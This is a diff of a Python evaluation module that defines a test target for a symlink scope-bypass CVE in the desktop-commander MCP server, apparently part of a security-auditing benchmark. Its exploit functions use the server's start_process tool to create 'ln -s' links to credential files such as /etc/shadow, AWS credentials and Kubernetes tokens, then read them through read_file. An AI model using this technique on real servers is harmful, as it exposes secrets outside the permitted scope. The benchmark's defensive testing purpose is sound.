@@ -1,41 +1,38 @@
-"""CVE-2025-11489: @wonderwhy-er/desktop-commander symlink scope bypass (CWE-22).
+"""CVE-2025-11489: @wonderwhy-er/desktop-commander symlink scope bypass (CWE-59/CWE-61).
 
 validatePath (src/tools/filesystem.ts) runs isPathAllowed on the unresolved path and only
 afterwards calls fs.realpath, so an in-scope symlink whose target is outside the allowed directory
 passes the scope check and read_file returns the out-of-scope target's bytes. The first patch 0.2.33
 (a1177ec / PR #321) resolves the symlink with fs.realpath before the check and rejects it.
 
-The filesystem builder mounts the workspace read-only and, for every planted file, creates an
-in-scope symlink /srv/app/leak<i>/report pointing at the planted coordinate. The exploit reads that
-symlink; the flaw follows it out of scope. Only file-kind places get a planted file and thus a leak
-symlink, so the sweep keeps exactly the file-kind arbitrary_read places.
+The layout is mounted read-write (filesystem_scope_env under a READ_WRITE host), so the exploit
+creates the in-scope symlink itself through the server's own start_process tool (`ln -s`) and then
+reads it: nothing is seeded inside the layout, which stays byte-for-byte universal.
 """
 
 import re
 from collections.abc import Awaitable, Callable
 
-from evals.cve_environments import filesystem_env
 from evals.cve_grammar import MechanismClass
-from evals.cve_layout import PROJECT  # "/srv/app", the in-scope checkout
-from evals.cve_places import Places
+from evals.cve_places import Places, PlantKind
 from evals.cve_planting import PlantingHost, SymbolicUser
+from evals.cve_planting_base import LayoutMount
+from evals.cve_planting_spec import resolve_container_path
 from evals.cve_targets import CVETarget
+from evals.holdout_environments import filesystem_scope_env
 from mcp_auditor.domain.ports import MCPClientPort
 
-# The exploit output must carry a nonce read through a leak symlink; the aim matches the leak path
-# the exploit sends (never the benign in-scope read of /srv/app/.git/HEAD).
-AIM = re.compile(r"/leak\d+/report")
+WORKING_DIRECTORY = "/srv/app"  # the in-scope checkout and the scope the launch passes
+# The read path the exploit sends matches this, and the benign in-scope read of /srv/app/.git/HEAD
+# does not, so an accidental surfacing by the benign call cannot read as aimed.
+AIM = re.compile(r"/srv/app/x\d+")
 
-# Every file-kind place reachable_by arbitrary_read: the only places the symlink read surfaces (a
-# file is planted at the coordinate and the builder links an in-scope path to it). Non-file
-# arbitrary_read places (hostname, env, unplaceable) carry no planted file and so no leak symlink.
-#
-# Layout settlement (the three source=layout places the kit left to the route check: the
-# settlement place workspace-dotenv and its two siblings bare-remote-url, bare-history-env). The
-# route check admits all three (the server's listing names /srv and the out-of-scope /srv/app.git),
-# but the symlink read surfaces a planted FILE through its leak symlink, and a layout node is
-# materialised directly in the tree with no leak symlink, so the exploit surfaces none of their
-# nonces (calibration reads each as a dead condition). No layout place is kept.
+# Every file-kind place reachable_by arbitrary_read: a nonce file is planted at the coordinate and
+# the exploit links an in-scope path to it, so the symlink read surfaces exactly these. One
+# non-file place is kept too, container-hostname, whose nonce Docker writes to /etc/hostname (via
+# --hostname); the exploit links an in-scope path to it, so the same symlink-follow read surfaces
+# it, exactly as for etc-hosts. proc-environ (kind=env) is not kept: read_file refuses
+# /proc/self/environ as a binary (NUL-separated) file. Layout places are left to the route check.
 KEPT_PLACES: tuple[str, ...] = (
     "etc-shadow",
     "aws-credentials",
@@ -56,19 +53,27 @@ KEPT_PLACES: tuple[str, ...] = (
     "k8s-sa-token",
     "etc-hosts",
     "auth-log",
+    "container-hostname",
 )
 
 
 def _coordinate_paths(places: Places, place_id: str) -> tuple[str, ...]:
-    coordinates = places[place_id].coordinates
-    if coordinates.paths is not None:
-        return coordinates.paths
-    return (coordinates.path,) if coordinates.path is not None else ()
+    # The on-disk paths the real software writes the place's value to, which the exploit links an
+    # in-scope path to. container-hostname surfaces through /etc/hostname (Docker fills it from
+    # --hostname), as for the HOSTNAME-kind place in every read fixture.
+    place = places[place_id]
+    if place.kind is PlantKind.HOSTNAME:
+        return ("/etc/hostname",)
+    coordinates = place.coordinates
+    raw = coordinates.paths if coordinates.paths is not None else (coordinates.path,)
+    return tuple(
+        resolve_container_path(path, WORKING_DIRECTORY) for path in raw if path is not None
+    )
 
 
-def _leak_indices(places: Places, place_id: str) -> list[int]:
-    # Mirror the builder's flat enumeration of planted files (places in KEPT order, each coordinate
-    # path in order) so an exploit reads the exact /srv/app/leak<i>/report created for its place.
+def _link_indices(places: Places, place_id: str) -> list[int]:
+    # The flat enumeration of linked files (places in KEPT order, each coordinate path in order) so
+    # an exploit's link name x<i> is the one it creates for its place.
     index = 0
     for current in KEPT_PLACES:
         paths = _coordinate_paths(places, current)
@@ -80,8 +85,14 @@ def _leak_indices(places: Places, place_id: str) -> list[int]:
 
 def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
     async def run(places: Places, client: MCPClientPort) -> None:
-        for index in _leak_indices(places, place_id):
-            await client.call_tool("read_file", {"path": f"{PROJECT}/leak{index}/report"})
+        for index, target in zip(
+            _link_indices(places, place_id), _coordinate_paths(places, place_id), strict=True
+        ):
+            link = f"{WORKING_DIRECTORY}/x{index}"
+            await client.call_tool(
+                "start_process", {"command": f"ln -s {target} {link}", "timeout_ms": 5000}
+            )
+            await client.call_tool("read_file", {"path": link})
 
     run.__name__ = f"read_{place_id.replace('-', '_')}"
     return run
@@ -89,27 +100,33 @@ def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
     # An in-scope, non-symlink read: succeeds on both versions, carries no nonce, not aimed.
-    await client.call_tool("read_file", {"path": f"{PROJECT}/.git/HEAD"})
+    await client.call_tool("read_file", {"path": f"{WORKING_DIRECTORY}/.git/HEAD"})
 
 
 TARGET = CVETarget(
     cve_id="CVE-2025-11489",
     severity="CVSS 7.5 (v3.1, placeholder)",
-    mechanisms=frozenset({MechanismClass.READ_OUTSIDE_SCOPE}),
+    mechanisms=frozenset({MechanismClass.READ_OUTSIDE_SCOPE, MechanismClass.COMMAND_EXECUTION}),
     aim=AIM,
-    reaches=frozenset({"arbitrary_read"}),
+    reaches=frozenset({"arbitrary_read", "command_execution"}),
     kept_places=KEPT_PLACES,
     images=("holdout-2025-11489-desktop-commander",),
     server_image="holdout-2025-11489-desktop-commander",
     patched_image="holdout-2025-11489-desktop-commander-patched",
-    planting_host=PlantingHost(SymbolicUser.HOST, PROJECT, has_network=False),
-    builder=filesystem_env,
+    planting_host=PlantingHost(
+        SymbolicUser.UNPRIVILEGED,
+        WORKING_DIRECTORY,
+        has_network=False,
+        layout_mount=LayoutMount.READ_WRITE,
+    ),
+    builder=filesystem_scope_env,
     exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
     benign=_benign,
     awaited_capability=None,
     note=(
-        "Symlink scope bypass (CWE-22): validatePath checks isPathAllowed on the unresolved path "
-        "before fs.realpath, so read_file follows an in-scope symlink to an out-of-scope target."
+        "Symlink scope bypass (CWE-59/CWE-61): validatePath checks isPathAllowed on the unresolved "
+        "path before fs.realpath, so read_file follows an in-scope symlink to an out-of-scope "
+        "target. The exploit places the link itself through start_process on the read-write layout."
     ),
     tools_filter=None,
 )
